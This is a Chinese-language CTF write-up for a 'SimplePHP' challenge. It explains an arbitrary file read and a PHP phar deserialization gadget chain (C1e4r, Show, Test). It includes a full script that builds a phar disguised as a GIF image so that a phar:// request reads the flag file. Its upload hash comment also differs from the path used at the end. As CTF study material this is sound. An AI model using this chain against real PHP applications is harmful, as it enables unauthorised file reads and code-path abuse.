## SimplePHP

> phar反序列化

首先注意到URL`file.php?file=`可能存在任意文件读取,成功将网站的源代码读取

分析源代码并结合提示`$this->source = phar://phar.jpg`此题目为phar反序列化漏洞

`file.php`中存在`file_exists($file)`可以通过phar进行反序列化

`function.php`中通过`upload_file_check`对文件类型进行了限制

`class.php`中`Test`类下的`file_get`函数中存在`file_get_contents`,可以尝试对flag进行读取

`Test::file_get`由`Test::__get`进行调用,`__get`方法有个特性,当访问类中某个不存在的变量时,会自动对`__get`进行调用,但是没有代码可以直接对`Test`类进行调用,因此需要在某个地方新建一个`Test`类

注意到在`Show`类下的`__toString`函数中有`$this->str['str']->source`,假设`this->str['str']`指向`Test`类,而`Test->source`不存在,因此会对`Test::__get`产生调用,因此可以将`this->str['str']`设置为`Test`

`__toString`方法在试图将类作为字符串输出时进行调用,而在`C1e4r`类中`__destruct`函数中有`echo $this->test;`,假设`$this->test`设置为`Show`,那么就可以对`Show::__toString`进行调用

```php
<?php
    class C1e4r{
        public $test;
        public $str;//$this->str=Show,run Show::__toString
    }
    class Show{
        public $source;
        public $str;//$this->str['str']->source,run Test::_get($key=source)
    }
    class Test{
        public $file;
        public $params;//$this->params['source']=f1ag.php
    }

    $a=new C1e4r();
    $b=new Show();
    $c=new Test();
    $a->str=$b;
    $b->str['str']=$c;
    $c->params['source']='/var/www/html/f1ag.php';//注意使用绝对路径因为..被过滤了
    var_dump($a);

    @unlink("asdf.phar");
    $phar=new Phar("asdf.phar");//后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");//设置文件头
    $phar->setMetadata($a);
    $phar->addFromString("test.txt","asdfghjkl");
    $phar->stopBuffering();
    @system("mv asdf.phar asdf.gif");
    var_dump("upload/".md5("asdf.gif"."172.16.128.254").".jpg");//upload/dd383397744862f041cbd2ee628876af.jpg
?>
```

将`asdf.gif`上传,并访问`file.php?file=phar://upload/337def6af3af5b39784016d8a5e06f8c.jpg`